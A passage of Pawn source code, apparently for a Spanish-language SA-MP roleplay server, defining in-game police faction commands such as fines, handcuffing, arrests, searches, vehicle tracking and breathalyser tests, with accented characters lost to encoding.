		return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /multa [ID/Jugador] [costo] [raz�n]");
	if(CopDuty[playerid] == 0)
	    return SendClientMessage(playerid, COLOR_YELLOW2, "�Debes estar en servicio como oficial de polic�a!");
	if(!ProxDetectorS(8.0, playerid, targetID))
		return SendClientMessage(playerid, COLOR_YELLOW2, "�El objetivo se encuentra demasiado lejos!");
	if(targetID == INVALID_PLAYER_ID)
	    return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{FF4600}[Error]:{C8C8C8} ID de jugador incorrecta.");
	if(targetID == playerid)
		return SendClientMessage(playerid, COLOR_YELLOW2, "�No puedes multarte a t� mismo!");
	if(cost > 50000 || cost < 1)
		return SendClientMessage(playerid, COLOR_YELLOW2, "�El costo no puede ser menor a $1 ni sobrepasar los $50.000!");

	SendFMessage(playerid, COLOR_YELLOW2, "Has multado a %s por $%d - raz�n: %s.", GetPlayerNameEx(targetID), cost, reason);
	SendFMessage(targetID, COLOR_YELLOW2, "%s te ha multado por $%d - raz�n: %s.", GetPlayerNameEx(playerid), cost, reason);
	SendClientMessage(targetID, COLOR_LIGHTYELLOW2, "{878EE7}[INFO]:{C8C8C8} escribe /aceptar multa, para pagar.");
	TicketOffer[targetID] = playerid;
	TicketMoney[targetID] = cost;
  	return 1;
}

CMD:quitar(playerid, params[])
{
	new itemString[64], targetID;

  	if(PlayerInfo[playerid][pFaction] != FAC_SIDE && PlayerInfo[playerid][pFaction] != FAC_PMA)
	  	return 1;
	if(sscanf(params, "us[64]", targetID, itemString)) {
		SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /quitar [ID/Jugador] [�tem]");
		return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "[Items]: licconducir, licvuelo, licarmas, armas.");
  	}
	if(CopDuty[playerid] == 0 && SIDEDuty[playerid] == 0)
		return SendClientMessage(playerid, COLOR_YELLOW2, "�Debes estar en servicio!");
	if(!ProxDetectorS(2.0, playerid, targetID))
		return SendClientMessage(playerid, COLOR_YELLOW2, "�El objetivo se encuentra demasiado lejos!");
	if(targetID == INVALID_PLAYER_ID)
 		return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{FF4600}[Error]:{C8C8C8} ID de jugador incorrecta.");
	if(targetID == playerid)
		return SendClientMessage(playerid, COLOR_YELLOW2, "�No te puedes revocar un �tem a t� mismo!");
		
	if(strcmp(itemString, "licconducir", true) == 0)
	{
		if(PlayerInfo[targetID][pCarLic] == 0)
  			return SendClientMessage(playerid, COLOR_YELLOW2, "�El sujeto no tiene una licencia de conducir!");
		PlayerPlayerActionMessage(playerid, targetID, 15.0, "le ha quitado la licencia de conducir a");
		PlayerInfo[targetID][pCarLic] = 0;
	} else
	if(strcmp(itemString, "licvuelo", true) == 0)
	{
 		if(PlayerInfo[targetID][pFlyLic] == 0)
   			return SendClientMessage(playerid, COLOR_YELLOW2, "�El sujeto no tiene una licencia de vuelo!");
		PlayerPlayerActionMessage(playerid, targetID, 10.0, "le ha quitado la licencia de vuelo a");
 		PlayerInfo[targetID][pFlyLic] = 0;
	} else
	if(strcmp(itemString, "licarmas", true) == 0)
	{
 		if(PlayerInfo[targetID][pWepLic] == 0)
    		return SendClientMessage(playerid, COLOR_YELLOW2, "�El sujeto no tiene una licencia de portaci�n de armas!");
		PlayerPlayerActionMessage(playerid, targetID, 10.0, "le ha quitado la licencia de armas a");
		PlayerInfo[targetID][pWepLic] = 0;
	} else
	if(strcmp(itemString, "armas", true) == 0)
	{
 		PlayerPlayerActionMessage(playerid, targetID, 10.0, "le ha quitado todas las armas a");
		ResetPlayerWeapons(targetID);
		for(new invslot = 0; invslot < INV_MAX_SLOTS; invslot++) {
		    if(GetItemType(GetInvItem(targetID, invslot)) == ITEM_WEAPON)
		        SetInvItemAndParam(playerid, invslot, 0, 0);
		}
	}
	return 1;
}

CMD:revisar(playerid, params[])
{
	new targetID;

	if(sscanf(params, "u", targetID))
		return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /revisar [ID/Jugador]");
	if(!IsPlayerConnected(targetID) || targetID == INVALID_PLAYER_ID || targetID == playerid)
	    return SendClientMessage(playerid, COLOR_YELLOW2, "Jugador inv�lido.");
	if(!ProxDetectorS(2.0, playerid, targetID))
		return SendClientMessage(playerid, COLOR_YELLOW2, "�El objetivo se encuentra demasiado lejos!");

	if(isPlayerCopOnDuty(playerid) || isPlayerSideOnDuty(playerid) ||
		GetPVarInt(targetID, "disabled") == DISABLE_DYING ||
		GetPVarInt(targetID, "disabled") == DISABLE_DEATHBED )
	{
		PrintHandsForPlayer(targetID, playerid);
		PrintInvForPlayer(targetID, playerid);
	  	ShowPocket(playerid, targetID);
	  	PrintToysForPlayer(targetID, playerid);
	  	PrintBackForPlayer(targetID, playerid);
		PlayerPlayerActionMessage(playerid, targetID, 15.0, "ha revisado en busca de objetos a");
	} else
	    {
	        SendFMessage(playerid, COLOR_LIGHTBLUE, "Quieres revisar a %s en busca de objetos. Para evitar abusos, debes esperar su respuesta.", GetPlayerNameEx(targetID));
			SendFMessage(targetID, COLOR_LIGHTBLUE, "%s quiere revisarte en busca de objetos. Para evitar abusos, tienes que usar /aceptar revision.", GetPlayerNameEx(playerid));
			ReviseOffer[targetID] = playerid;
		}
	return 1;
}

CMD:buscados(playerid, params[])
{
    new count = 0;

	if(PlayerInfo[playerid][pFaction] != FAC_SIDE && PlayerInfo[playerid][pFaction] != FAC_PMA)
		return 1;
	if(CopDuty[playerid] == 0 && SIDEDuty[playerid] == 0)
    	return SendClientMessage(playerid, COLOR_YELLOW2, "�Debes estar en servicio!");

	SendClientMessage(playerid, COLOR_LIGHTGREEN, "-----------[Sospechosos buscados]-----------");
    foreach(new i : Player)	{
	    if(PlayerInfo[i][pWantedLevel] >= 1) {
	        SendFMessage(playerid, COLOR_WHITE, "[BUSCADOS]: %s (ID:%d) -  nivel de b�squeda: %d.", GetPlayerNameEx(i), i, PlayerInfo[i][pWantedLevel]);
			count++;
		}
	}
	if(count == 0)
		SendClientMessage(playerid,COLOR_WHITE,"{878EE7}[INFO]:{C8C8C8} no hay criminales buscados on-line.");
	SendClientMessage(playerid, COLOR_LIGHTGREEN, "------------------------------------------------");
	return 1;
}

CMD:esposar(playerid, params[])
{
	new targetID;

 	if(PlayerInfo[playerid][pFaction] != FAC_SIDE && PlayerInfo[playerid][pFaction] != FAC_PMA)
 		return 1;
	if(sscanf(params, "u", targetID))
		return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /esposar [ID/Jugador]");
  	if(CopDuty[playerid] == 0 && SIDEDuty[playerid] == 0)
  		return SendClientMessage(playerid, COLOR_YELLOW2, "�Debes estar en servicio!");
	if(targetID == INVALID_PLAYER_ID)
 		return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{FF4600}[Error]:{C8C8C8} ID de jugador incorrecta.");
 	if(PlayerCuffed[targetID] == 1)
		return SendClientMessage(playerid, COLOR_YELLOW2, "�El objetivo ya se encuentra esposado!");
	if(!ProxDetectorS(1.0, playerid, targetID))
		return SendClientMessage(playerid, COLOR_YELLOW2, "�El objetivo se encuentra demasiado lejos!");
	if(targetID == playerid)
		return SendClientMessage(playerid, COLOR_YELLOW2, "�No puedes esposarte a t� mismo!");

	SendFMessage(targetID, COLOR_LIGHTBLUE, "�Has sido esposado por %s!", GetPlayerNameEx(playerid));
	SendFMessage(playerid, COLOR_LIGHTBLUE, "�Has esposado a %s!", GetPlayerNameEx(targetID));
	PlayerPlayerActionMessage(playerid, targetID, 15.0, "ha esposado a");
	SetPlayerSpecialAction(targetID, SPECIAL_ACTION_CUFFED);
	SetPlayerAttachedObject(targetID, 0, 19418, 6, -0.011000, 0.028000, -0.022000, -15.600012, -33.699977, -81.700035, 0.891999, 1.000000, 1.168000);
	PlayerCuffed[targetID] = 1;
	return 1;
}

CMD:arrastrar(playerid, params[])
{
	new target, vehicleid;

	if(PlayerInfo[playerid][pFaction] != FAC_SIDE && PlayerInfo[playerid][pFaction] != FAC_PMA)
		return 1;
	if(sscanf(params, "u", target))
		return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /arrastrar [ID/Jugador]");
	if(CopDuty[playerid] == 0 && SIDEDuty[playerid] == 0)
		return SendClientMessage(playerid, COLOR_YELLOW2, "�Debes estar en servicio!");

	if(IsPlayerInAnyVehicle(playerid))
		vehicleid = GetPlayerVehicleID(playerid);
	else
 		vehicleid = GetClosestVehicle(playerid, 4.0);

	if(vehicleid == INVALID_VEHICLE_ID || target == INVALID_PLAYER_ID)
		return SendClientMessage(playerid, COLOR_YELLOW2, "Veh�culo o jugador incorrecto.");
	if(VehicleInfo[vehicleid][VehFaction] != FAC_PMA && VehicleInfo[vehicleid][VehFaction] != FAC_SIDE)
	    return SendClientMessage(playerid, COLOR_YELLOW2, "El veh�culo no pertenece a tu facci�n.");
	if(!ProxDetectorS(1.5, playerid, target))
	    return SendClientMessage(playerid, COLOR_YELLOW2, "El jugador se encuentra demasiado lejos.");

 	PutPlayerInVehicle(target, vehicleid, 1);
  	PlayerPlayerActionMessage(playerid, target, 15.0, "ha arrastrado al m�vil a");
	return 1;
}

CMD:quitaresposas(playerid, params[])
{
	new targetID;

	if(PlayerInfo[playerid][pFaction] != FAC_SIDE && PlayerInfo[playerid][pFaction] != FAC_PMA)
		return 1;
	if(sscanf(params, "u", targetID))
		return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /quitaresposas [ID/Jugador]");
	if(CopDuty[playerid] == 0 && SIDEDuty[playerid] == 0)
		return SendClientMessage(playerid, COLOR_YELLOW2, "�Debes estar en servicio!");
	if(targetID == INVALID_PLAYER_ID)
 		return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{FF4600}[Error]:{C8C8C8} ID de jugador incorrecta.");
	if(PlayerCuffed[targetID] == 0)
 		return SendClientMessage(playerid, COLOR_YELLOW2, "�El objetivo no est� esposado!");
	if(!ProxDetectorS(1.0, playerid, targetID))
		return SendClientMessage(playerid, COLOR_YELLOW2, "�El objetivo se encuentra demasiado lejos!");
	if(targetID == playerid)
		return SendClientMessage(playerid, COLOR_YELLOW2, "�No puedes quitarte las esposas a t� mismo!");

	SendFMessage(targetID, COLOR_LIGHTBLUE, "�%s te ha quitado las esposas!", GetPlayerNameEx(playerid));
	SendFMessage(playerid, COLOR_LIGHTBLUE, "�Le has quitado las esposas a %s!", GetPlayerNameEx(targetID));
	PlayerPlayerActionMessage(playerid, targetID, 15.0, "le ha quitado las esposas a");
	SetPlayerSpecialAction(targetID, SPECIAL_ACTION_NONE);
	RemovePlayerAttachedObject(targetID, 0);
	PlayerCuffed[targetID] = 0;
	return 1;
}

CMD:arrestar(playerid, params[])
{
	new	targetID, time, string[128], str[128], reason[128];

	if(PlayerInfo[playerid][pFaction] != FAC_PMA)
		return 1;
	if(sscanf(params, "uds[128]", targetID, time, reason))
		return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /arrestar [ID/Jugador] [tiempo] [raz�n]");
	if(CopDuty[playerid] == 0)
 		return SendClientMessage(playerid, COLOR_YELLOW2, "�Debes estar en servicio como oficial de polic�a!");
	if(!PlayerToPoint(15.0, playerid, POS_POLICE_ARREST_X, POS_POLICE_ARREST_Y, POS_POLICE_ARREST_Z))
		return SendClientMessage(playerid, COLOR_YELLOW2, "�Debes estar en el escritorio junto al calabozo!");
	if(time < 1 || time > 700)
		return SendClientMessage(playerid, COLOR_YELLOW2, "�El tiempo no puede ser menor a 1 minuto ni mayor a 700!");
	if(GetDistanceBetweenPlayers(playerid, targetID) > 5)
 		return SendClientMessage(playerid, COLOR_YELLOW2, "�El sujeto debe estar cerca tuyo!");
	if(PlayerInfo[targetID][pWantedLevel] < 1)
		return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "�El sujeto no tiene ning�n cargo!");

	SendFMessage(playerid, COLOR_LIGHTBLUE, "�Has arrestado a %s!", GetPlayerNameEx(targetID));
	ResetPlayerWeapons(targetID);
	PlayerInfo[targetID][pJailTime] = time * 60;
	SendFMessage(targetID, COLOR_LIGHTBLUE, "�Arrestado! - Tiempo: %d minutos.", time);
	SendClientMessage(targetID, COLOR_LIGHTYELLOW2, "Recuerda que al estar arrestado no se resetear� el tiempo para volver a trabajar hasta el proximo PayDay en libertad.");
	format(string, sizeof(string), "[Dpto. de polic�a]: %s ha arrestado al criminal %s.", GetPlayerNameEx(playerid), GetPlayerNameEx(targetID));
	SendFactionMessage(FAC_PMA, COLOR_PMA, string);
	PlayerInfo[targetID][pJailed] = 1;
	ResetPlayerWantedLevelEx(targetID);
	GiveFactionMoney(FAC_GOB, PlayerInfo[targetID][pJailTime]);
	format(str, sizeof(str), "%s", reason);
	AntecedentesLog(playerid, targetID, str);
	SaveFactions();
	return 1;
}
CMD:m(playerid, params[]) {
	cmd_megafono(playerid, params);
	return 1;
}

CMD:megafono(playerid, params[])
{
	new text[128], string[128], factionID = PlayerInfo[playerid][pFaction];

	if(sscanf(params, "s[128]", text))
		return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} (/m)eg�fono [mensaje]");
	if(factionID != FAC_PMA || CopDuty[playerid] != 1)
	    return SendClientMessage(playerid, COLOR_YELLOW2, "No tienes un meg�fono o no te encuentras en servicio.");
	if(!IsPlayerInAnyVehicle(playerid) || VehicleInfo[GetPlayerVehicleID(playerid)][VehFaction] != factionID)
		return SendClientMessage(playerid, COLOR_YELLOW2, "�Debes estar en un veh�culo con meg�fono!");
	if(Muted[playerid])
		return SendClientMessage(playerid, COLOR_RED, "{FF4600}[Error]:{C8C8C8} no puedes usar el meg�fono, te encuentras silenciado.");

	format(string, sizeof(string), "[Meg�fono]: %s %s: �%s!", GetRankName(PlayerInfo[playerid][pFaction], PlayerInfo[playerid][pRank]), GetPlayerNameEx(playerid), text);
	ProxDetector(60.0, playerid, string, COLOR_PMA, COLOR_PMA, COLOR_PMA, COLOR_PMA, COLOR_PMA);
	return 1;
}

CMD:pservicio(playerid, params[])
{
	new string[128];

    if(PlayerInfo[playerid][pFaction] != FAC_PMA)
		return 1;
	if(!PlayerToPoint(5.0, playerid, POS_POLICE_DUTY_X, POS_POLICE_DUTY_Y, POS_POLICE_DUTY_Z))
	    return SendClientMessage(playerid, COLOR_YELLOW2, "�Debes estar en el vestuario!");

	if(CopDuty[playerid] == 0)
	{
		PlayerActionMessage(playerid, 15.0, "toma su placa identificatoria y su radio del armario.");
		CopDuty[playerid] = 1;
		format(string, sizeof(string), "[Dpto. de polic�a]: %s est� en servicio como oficial de polic�a.", GetPlayerNameEx(playerid));
		SendFactionMessage(FAC_PMA, COLOR_PMA, string);
	}
	else
	{
		PlayerActionMessage(playerid, 15.0, "se quita la placa de polic�a y su radio, y las guarda en el armario.");
		EndPlayerDuty(playerid);
		format(string, sizeof(string), "[Dpto. de polic�a]: %s se retira de servicio como oficial de polic�a.", GetPlayerNameEx(playerid));
		SendFactionMessage(FAC_PMA, COLOR_PMA, string);
		SetPlayerSkin(playerid, PlayerInfo[playerid][pSkin]);
		SetPVarInt(playerid, "cantSaveItems", 1);
		SetTimerEx("cantSaveItems", 2000, false, "i", playerid);
	}
	return 1;
}

CMD:sosp(playerid, params[]) {
	cmd_sospechoso(playerid, params);
	return 1;
}

CMD:sospechoso(playerid, params[])
{
	new string[128], reason[64], targetID;

  	if(PlayerInfo[playerid][pFaction] != FAC_PMA)
	  	return 1;
	if(sscanf(params, "us[64]", targetID, reason))
		return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} (/sosp)echoso [ID/Jugador] [cr�men]");
  	if(!IsPlayerConnected(targetID) && targetID != INVALID_PLAYER_ID)
   		return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{FF4600}[Error]:{C8C8C8} ID inv�lida.");
	if(targetID == playerid)
 		return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{FF4600}[Error]:{C8C8C8} no puedes hacerlo contigo mismo.");
	if(CopDuty[playerid] == 0)
 		return SendClientMessage(playerid, COLOR_YELLOW2, "�Debes estar en servicio como oficial de polic�a!");

	SetPlayerWantedLevelEx(targetID, PlayerInfo[targetID][pWantedLevel] + 1);
	SendFMessage(playerid, COLOR_YELLOW2, "Has marcado a %s como sospechoso por: %s.", GetPlayerNameEx(targetID), reason);
	format(string, sizeof(string), "[Dpto. de polic�a]: %s ha marcado a %s como sospechoso por: %s.", GetPlayerNameEx(playerid), GetPlayerNameEx(targetID), reason);
	SendFactionMessage(FAC_PMA, COLOR_PMA, string);
	PlayerInfo[targetID][pAccusedOf] = reason;
	PlayerInfo[targetID][pAccusedBy] = GetPlayerNameEx(playerid);
	return 1;
}

CMD:localizar(playerid,params[])
{
    new targetVehicle;

	if(PlayerInfo[playerid][pFaction] != FAC_SIDE && PlayerInfo[playerid][pFaction] != FAC_PMA)
		return 1;
    if(sscanf(params, "i", targetVehicle))
   		return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /localizar [ID Vehiculo]");
   	if(CopDuty[playerid] == 0 && SIDEDuty[playerid] == 0)
    	return SendClientMessage(playerid, COLOR_YELLOW2, "�Debes estar en servicio!");
	if(PlayerInfo[playerid][pFaction] == FAC_PMA)
	{
		if(VehicleInfo[GetPlayerVehicleID(playerid)][VehFaction] != FAC_PMA && GetPlayerBuilding(playerid) != BLD_PMA)
	    	return SendClientMessage(playerid, COLOR_WHITE, "Debes estar en la comisar�a o dentro de una patrulla.");
	}
	if(CopTrace[playerid] != 0)
	    return SendClientMessage(playerid, COLOR_WHITE, "Debes esperar 30 segundos antes de usar nuevamente el comando.");
	if(targetVehicle == INVALID_VEHICLE_ID || VehicleInfo[targetVehicle][VehFaction] != PlayerInfo[playerid][pFaction])
	    return SendClientMessage(playerid, COLOR_WHITE, "Vehiculo no disponible para rastreo. (Debe ser de tu facci�n)");

	new Float:vehPosX, Float:vehPosY, Float:vehPosZ, string[128], area[MAX_ZONE_NAME];
	GetVehiclePos(targetVehicle, vehPosX, vehPosY, vehPosZ);
	SetPlayerCheckpoint(playerid, vehPosX, vehPosY, vehPosZ, 4.0);
	GetCoords2DZone(vehPosX, vehPosY, area, MAX_ZONE_NAME);
	format(string, sizeof(string),"[Central]: %s ha rastreado el m�vil Nro.%d en la zona de %s.", GetPlayerNameEx(playerid), targetVehicle, area);
	if(PlayerInfo[playerid][pFaction] == FAC_SIDE)
		SendFactionMessage(FAC_SIDE, COLOR_PMA, string);
	else
	    SendFactionMessage(FAC_PMA, COLOR_PMA, string);
    SendClientMessage(playerid, COLOR_YELLOW2, "Localizas mediante rastreo satelital la ubicaci�n precisa del m�vil. Esta se ha marcado en tu GPS.");
	CopTrace[playerid] = 1;
	SetTimerEx("CopTraceAvailable", 30000, false, "i", playerid);
	return 1;
}
public CopTraceAvailable(playerid)
{
	CopTrace[playerid] = 0;
	return 1;
}

CMD:pipeta(playerid,params[])
{
    new 
        targetid;	
	 
	if(sscanf(params, "u", targetid))
   		return SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{5CCAF1}[Sintaxis]:{C8C8C8} /pipeta [ID/jugador]");
    if(PlayerInfo[playerid][pFaction] != FAC_PMA)
		return 1;
	if(CopDuty[playerid] == 0)
    	return SendClientMessage(playerid, COLOR_YELLOW2, "�Debes estar en servicio!");
	if(OfferingPipette[playerid] == 1)
	    return SendClientMessage(playerid,COLOR_YELLOW2,"Ya has ofrecido una pipeta para que soplen.");
	
	SendFMessage (playerid, COLOR_LIGHTYELLOW2, "Le diste una pipeta para que sople a %s, debes esperar que el sujeto responda.", GetPlayerNameEx(targetid));
    SendFMessage (targetid, COLOR_LIGHTYELLOW2, "%s te d�o una pipeta de alcoholemia para que soples. (Utiliz� /soplarpipeta)", GetPlayerNameEx (playerid));
	BlowingPipette[targetid] = 1;
	OfferingPipette[playerid] = 1;
	SetTimerEx("AceptarPipeta", 20000, false, "i", playerid);
	return 1;
}

public AceptarPipeta(playerid)
{
	OfferingPipette[playerid] = 0;
	return 1;
}

CMD:soplarpipeta(playerid,params[])
{
    if(BlowingPipette[playerid] == 0)
	    return SendClientMessage(playerid,COLOR_YELLOW2, "Ning�n oficial te esta ofreciendo una pipeta para soplar.");
		
	BlowingPipette[playerid] = 0;
	PlayerActionMessage(playerid, 15.0, "toma la pipeta ofrecida por el oficial y comienza a soplarla");
    SetTimerEx("SoplandoPipeta", 6000, false, "i", playerid);
	TogglePlayerControllable(playerid, false);
    SetTimerEx("Unfreeze", 6000, false, "i", playerid);
    return 1;
}
		
	
public SoplandoPipeta(playerid)
{
	if(GetPlayerDrunkLevel(playerid) > 0)
		PlayerDoMessage(playerid, 15.0, "La pipeta marca que se super� el limite permitido de alcohol en la sangre.");
	else
		PlayerDoMessage(playerid, 15.0, "La pipeta indica que no hay alcohol en la sangre.");
	return 1;
}

CMD:ref(playerid, params[]) {
	cmd_refuerzos(playerid, params);
	return 1;
}

CMD:refuerzos(playerid, params[])
{
	new cmde;

	if(PlayerInfo[playerid][pFaction] != FAC_SIDE && PlayerInfo[playerid][pFaction] != FAC_PMA && PlayerInfo[playerid][pFaction] != FAC_HOSP)
		return 1;
    if(sscanf(params, "d", cmde))
        return SendClientMessage(playerid, COLOR_GREY, "{5CCAF1}[Sintaxis]:{C8C8C8} (/ref)uerzos [SIDE =1 , PMA = 2, HMA = 3, TODOS = 4]");
	if(CopDuty[playerid] == 0 && SIDEDuty[playerid] == 0 && MedDuty[playerid] == 0)
    	return SendClientMessage(playerid, COLOR_YELLOW2, "�Debes estar en servicio!");
	if(cmde < 1 || cmde > 4)
	    return SendClientMessage(playerid, COLOR_GREY, "{5CCAF1}[Sintaxis]:{C8C8C8} (/ref)uerzos [SIDE = 1, PMA = 2, HMA = 3, TODOS = 4]");

	new Float:x, Float:y, Float:z, area[MAX_ZONE_NAME];
	GetPlayerPos(playerid, x, y ,z);
	GetCoords2DZone(x, y, area, MAX_ZONE_NAME);
 	if(GetPVarInt(playerid, "requestingBackup") != 1)
	{
	    SetPVarInt(playerid, "requestingBackup", 1);
		switch(cmde)
		{
			case 1: {
				foreach(Player, i) {
					if(PlayerInfo[i][pFaction] == FAC_SIDE && SIDEDuty[i]) {
						SetPlayerMarkerForPlayer(i, playerid, COLOR_DBLUE);
						SendFMessage(i, COLOR_GREY, "[CENTRAL]: %s requiere asistencia inmediata en la zona de %s, lo marcamos en azul en el mapa.", GetPlayerNameEx(playerid), area);
					}
				}
			}
			case 2: {
				foreach(Player, i) {
					if(PlayerInfo[i][pFaction] == FAC_PMA && CopDuty[i]) {
						SetPlayerMarkerForPlayer(i, playerid, COLOR_DBLUE);
						SendFMessage(i, COLOR_GREY, "[CENTRAL]: %s requiere asistencia inmediata en la zona de %s, lo marcamos en azul en el mapa.", GetPlayerNameEx(playerid), area);
					}
				}
			}
			case 3: {
				foreach(Player, i) {
					if(PlayerInfo[i][pFaction] == FAC_HOSP && MedDuty[i]) {
						SetPlayerMarkerForPlayer(i, playerid, COLOR_DBLUE);
						SendFMessage(i, COLOR_GREY, "[CENTRAL]: %s requiere asistencia inmediata en la zona de %s, lo marcamos en azul en el mapa.", GetPlayerNameEx(playerid), area);
					}
				}
			}
			case 4: {
				foreach(Player, i) {
					if( (PlayerInfo[i][pFaction] == FAC_PMA && CopDuty[i]) || (PlayerInfo[i][pFaction] == FAC_HOSP && MedDuty[i]) || (PlayerInfo[i][pFaction] == FAC_SIDE && SIDEDuty[i]) ) {
						SetPlayerMarkerForPlayer(i, playerid, COLOR_DBLUE);
						SendFMessage(i, COLOR_GREY, "[CENTRAL]: %s requiere asistencia inmediata en la zona de %s, lo marcamos en azul en el mapa.", GetPlayerNameEx(playerid), area);
					}
				}
			}
		}
	}
	SendClientMessage(playerid, COLOR_WHITE, "Para cancelar la solicitud utiliza /cref");
	return 1;
}

CMD:cref(playerid, params[]) {
	BackupClear(playerid, 0);
	return 1;
}

CMD:vercargos(playerid, params[])
{
	new targetid;
	
	if(PlayerInfo[playerid][pFaction] != FAC_SIDE && PlayerInfo[playerid][pFaction] != FAC_PMA)
		return 1;
    if(sscanf(params, "u", targetid))
        return SendClientMessage(playerid, COLOR_GREY, "{5CCAF1}[Sintaxis]:{C8C8C8} /vercargos [ID/Jugador]");
	if(CopDuty[playerid] == 0 && SIDEDuty[playerid] == 0)
    	return SendClientMessage(playerid, COLOR_YELLOW2, "�Debes estar en servicio!");
    if(targetid == INVALID_PLAYER_ID)
        return SendClientMessage(playerid, COLOR_YELLOW2, "Jugador inv�lido.");
	if(PlayerInfo[playerid][pFaction] == FAC_PMA)
	{
	 	if(VehicleInfo[GetPlayerVehicleID(playerid)][VehFaction] != FAC_PMA && GetPlayerBuilding(playerid) != BLD_PMA)
	 	    return SendClientMessage(playerid, COLOR_YELLOW2, "Debes estar en la comisar�a o dentro de una patrulla.");
	} else
		if(PlayerInfo[playerid][pFaction] == FAC_SIDE)
		{
		 	if(VehicleInfo[GetPlayerVehicleID(playerid)][VehFaction] != FAC_SIDE && GetPlayerBuilding(playerid) != BLD_SIDE)
		 	    return SendClientMessage(playerid, COLOR_YELLOW2, "Debes estar en la central o dentro de algun m�vil.");
		}

	SendFMessage(playerid, COLOR_LIGHTGREEN, "==================[Cargos de %s]==================", GetPlayerNameEx(targetid));
	SendFMessage(playerid, COLOR_WHITE, "- Nivel de b�squeda: %d", PlayerInfo[targetid][pWantedLevel]);
	SendFMessage(playerid, COLOR_WHITE, "- Acusado de: %s", PlayerInfo[targetid][pAccusedOf]);
	SendFMessage(playerid, COLOR_WHITE, "- Acusado por: %s", PlayerInfo[targetid][pAccusedBy]);
	return 1;
}

CMD:geof(playerid, params[])
{
	new string[128], toggle;

	if(PlayerInfo[playerid][pFaction] != FAC_PMA)
		return 1;
	if(PlayerInfo[playerid][pRank] > 4 || !CopDuty[playerid])
	    return SendClientMessage(playerid, COLOR_YELLOW2, "Debes estar en servicio como polic�a y tener el rango suficiente.");
	if(sscanf(params, "i", toggle)) {
 		SendClientMessage(playerid, COLOR_GREY, "{5CCAF1}[Sintaxis]:{C8C8C8} /geof [0-1]");
   		switch(GEOF) {
			case 0: SendClientMessage(playerid, COLOR_WHITE, "Estado G.E.O.F.: {D40000}desautorizado");
		    case 1: SendClientMessage(playerid, COLOR_WHITE, "Estado G.E.O.F.: {00D41C}autorizado");
   		}
   		return 1;
	}
	if(toggle < 0 || toggle > 1)
	    return SendClientMessage(playerid, COLOR_GREY, "{5CCAF1}[Sintaxis]:{C8C8C8} /geof [0-1]");

	if(toggle == 1 && GEOF != 1) {
 		format(string, sizeof(string), "�Atenci�n a todas las unidades! el G.E.O.F. ha sido autorizado por %s.", GetPlayerNameEx(playerid));
		SendFactionMessage(FAC_PMA, COLOR_PMA, string);
        GEOF = 1;
	} else
		if(toggle == 0 && GEOF != 0) {
  			format(string, sizeof(string), "�Atenci�n a todas las unidades! el G.E.O.F. ha sido desautorizado por %s.", GetPlayerNameEx(playerid));
			SendFactionMessage(FAC_PMA, COLOR_PMA, string);
	        GEOF = 0;
		}
	return 1;
}

CMD:ult(playerid, params[]) {
	cmd_ultimallamada(playerid, params);
	return 1;
}

CMD:ultimallamada(playerid, params[])
{
	new faction = PlayerInfo[playerid][pFaction];
	
	if(faction != FAC_PMA && faction != FAC_HOSP)
	    return 1;
	if(!CopDuty[playerid] && !MedDuty[playerid])
	    return SendClientMessage(playerid, COLOR_YELLOW2, "Debes estar en servicio como param�dico o polic�a.");
	

	if(faction == FAC_PMA)
	{
	    if(lastPoliceCallNumber == 0)
			return SendClientMessage(playerid, COLOR_YELLOW2, "La �ltima llamada no ha podido ser registrada.");
   		if(VehicleInfo[GetPlayerVehicleID(playerid)][VehFaction] != FAC_PMA && GetPlayerBuilding(playerid) != BLD_PMA)
			return SendClientMessage(playerid, COLOR_YELLOW2, "Debes estar en la comisar�a o dentro de una patrulla.");
  		SetPlayerCheckpoint(playerid, lastPoliceCallPos[0], lastPoliceCallPos[1], lastPoliceCallPos[2], 3.0);
  		SendFMessage(playerid, COLOR_PMA, "El �ltimo llamado al 911 (polic�a) ha sido con el n�mero %d, ultima localizaci�n marcada en tu GPS.", lastPoliceCallNumber);
	} else
		if(faction == FAC_HOSP)
		{
		    if(lastMedicCallNumber == 0)
				return SendClientMessage(playerid, COLOR_YELLOW2, "La �ltima llamada no ha podido ser registrada.");
	   		if(VehicleInfo[GetPlayerVehicleID(playerid)][VehFaction] != FAC_HOSP && GetPlayerBuilding(playerid) != BLD_HOSP && GetPlayerBuilding(playerid) != BLD_HOSP2)
	   		    return SendClientMessage(playerid, COLOR_YELLOW2, "Debes estar en el hospital o dentro de un veh�culo de param�dico.");
		    SetPlayerCheckpoint(playerid, lastMedicCallPos[0], lastMedicCallPos[1], lastMedicCallPos[2], 3.0);
		    SendFMessage(playerid, COLOR_PMA, "El �ltimo llamado al 911 (param�dicos) ha sido con el n�mero %d, ultima localizaci�n marcada en tu GPS.", lastMedicCallNumber);
		}
	return 1;
}

stock EndPlayerDuty(playerid)
{
	if(isPlayerCopOnDuty(playerid) || isPlayerSideOnDuty(playerid))
	{
		CopDuty[playerid] = 0;
		SIDEDuty[playerid] = 0;
		SetPlayerArmour(playerid, 0);
		resetTazer(playerid);
		SendClientMessage(playerid, COLOR_WHITE, "Ya no te encuentras en servicio.");
	}
}

